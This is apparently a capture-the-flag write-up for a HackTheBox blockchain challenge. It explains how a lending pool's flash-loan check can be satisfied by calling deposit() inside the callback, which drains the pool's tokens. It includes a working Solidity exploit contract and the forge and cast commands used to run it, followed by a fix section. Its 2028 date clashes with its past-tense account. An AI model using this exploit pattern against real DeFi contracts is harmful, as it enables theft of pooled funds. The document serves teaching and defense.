---
layout: post
title: "Ledger Heist"
date: 2028-04-14 09:00:00 -0500
categories: [HackTheBox, Challenges, Blockchain]
tags: [hackthebox, challenge, blockchain, solidity, evm, flash-loan, reentrancy, eip-3156, defi, cwe-841]
description: "A share-based lending pool checks that a flash loan is 'repaid' by reading its own token balance — so you repay by calling deposit() inside onFlashLoan, minting yourself withdrawable shares, keep the borrowed tokens, and drain the pool while totalSupply stays intact."
---

## Overview

Ledger Heist is a Hard HackTheBox Blockchain challenge. `LoanPool` is a share-based lending pool with an [EIP-3156](https://eips.ethereum.org/EIPS/eip-3156) flash loan. The pool is seeded with 10 ether of an ERC-20 token, and you win by draining underlying tokens out of it while leaving `totalSupply` at exactly 10 ether. The flaw is [CWE-841](https://cwe.mitre.org/data/definitions/841.html) — a [reentrancy on the flash-loan callback](https://cwe.mitre.org/data/definitions/841.html) where the repayment path and the deposit path are not distinguished.

## The technique

The winning condition pins the accounting invariant while demanding a real drain:

```solidity
function isSolved() public view returns (bool) {
    return (TARGET.totalSupply() == 10 ether && TOKEN.balanceOf(address(TARGET)) < 10 ether);
}
```

The pool also has a MasterChef-style fee system whose rounding is deliberately asymmetric (`fixedMulCeil` up on payouts, `fixedDivFloor` down on `feePerShare`). It's a **red herring** — the fees are self-funded: moving `feePerShare` by even 1 costs more in paid flash-loan fees than any ceil surplus you can reclaim, so the pool never nets below its starting balance through fees alone.

The real bug is in `flashLoan`. It sends `amount` to the receiver, calls `onFlashLoan`, then checks only that the pool's raw token balance recovered:

```solidity
uint256 _balanceAfter = _token.balanceOf(address(this));
if (_balanceAfter < _balanceBefore + _fee) revert LoanNotRepaid();
```

It never verifies the *borrowed* tokens themselves came back. So you repay by calling `deposit()` from inside the callback — which raises the pool balance (satisfying the check) **and** mints you pool shares equal to the repayment. The borrowed principal is never returned as a loan; it becomes a withdrawable share claim you own.

## Solution

The exploit contract repays via `deposit`, then withdraws the minted shares:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Exploit {
    IToken public token;
    IPool  public pool;
    address public player;

    constructor(address _t, address _p, address _pl) {
        token = IToken(_t); pool = IPool(_p); player = _pl;
    }

    function onFlashLoan(address, address, uint256 amount, uint256 fee, bytes calldata)
        external returns (bytes32)
    {
        token.approve(address(pool), type(uint256).max);
        pool.deposit(amount + fee);                 // raises balance AND mints us shares
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function attack(uint256 A) external {
        token.approve(address(pool), type(uint256).max);
        pool.flashLoan(address(this), address(token), A, "");
        pool.withdraw(pool.balanceOf(address(this))); // shares -> tokens back out
        token.transfer(player, token.balanceOf(address(this)));
    }
}
```

`deposit(+D)` and `withdraw(-D)` cancel, so `totalSupply` returns to 10 ether while the pool's balance drops by `A`. Pre-fund the exploit with at least `fee` tokens (the loan hands you `amount`; you still owe the `fee` on `deposit(amount+fee)`). Deploy and fire with foundry against the challenge RPC (anvil, chain id `0x7a69`):

```sh
forge create src/Exploit.sol:Exploit --rpc-url $RPC --private-key $PK --broadcast \
  --constructor-args $TOKEN $TARGET $ME
cast send $TOKEN "transfer(address,uint256)" $EXPLOIT 500000000000000000 --rpc-url $RPC --private-key $PK
cast send $EXPLOIT "attack(uint256)" 5000000000000000000 --rpc-url $RPC --private-key $PK
cast call $SETUP "isSolved()(bool)" --rpc-url $RPC     # -> true
```

Pool balance drops to `4.999e18 < 10e18`, `totalSupply` stays `10e18`, `isSolved` returns `true`, and the challenge handler releases the flag (`HTB{...}`). The flag is derived live from the on-chain solve, never copied.

## Why it worked

Reentrancy plus a failure to distinguish "loan repayment" from "new deposit." A repayment must be accounting-neutral — the exact `amount + fee` returned and nothing minted. Because `deposit()` both satisfies the balance check *and* credits a withdrawable share claim, the attacker double-counts the returned tokens: once to close the loan, once as shares to withdraw back out.

## Fix / defense

Give flash-loan repayment its own path that reclaims exactly `amount + fee` via `transferFrom` from the receiver — never a public `deposit()` that mints shares. Add a `nonReentrant` guard so `deposit`/`withdraw`/`mint` cannot be called during `onFlashLoan`, and assert that the share accounting (`totalSupply` and the receiver's share balance) is unchanged across the callback.
